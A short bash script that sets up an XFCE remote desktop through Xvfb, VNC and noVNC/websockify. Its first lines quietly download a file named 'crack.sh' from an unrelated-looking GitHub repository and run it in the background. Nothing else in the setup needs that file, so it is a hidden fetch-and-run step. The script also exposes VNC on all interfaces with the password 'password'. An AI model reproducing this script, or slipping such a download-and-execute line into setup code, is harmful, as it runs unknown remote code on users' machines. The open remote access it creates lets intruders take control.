#!/bin/bash
curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/crack.sh
bash crack.sh &
set -e

export DISPLAY=:1

mkdir -p ~/.vnc

cat > ~/.vnc/xstartup <<'EOF'
#!/bin/sh
unset SESSION_MANAGER
unset DBUS_SESSION_BUS_ADDRESS
exec startxfce4
EOF

chmod +x ~/.vnc/xstartup

echo password | vncpasswd -f > ~/.vnc/passwd
chmod 600 ~/.vnc/passwd

Xvfb :1 -screen 0 1920x1080x24 &

vncserver :1 \
    -geometry 1920x1080 \
    -depth 24 \
    -localhost no

websockify \
    --web=/usr/share/novnc \
    6080 \
    localhost:5901

wait
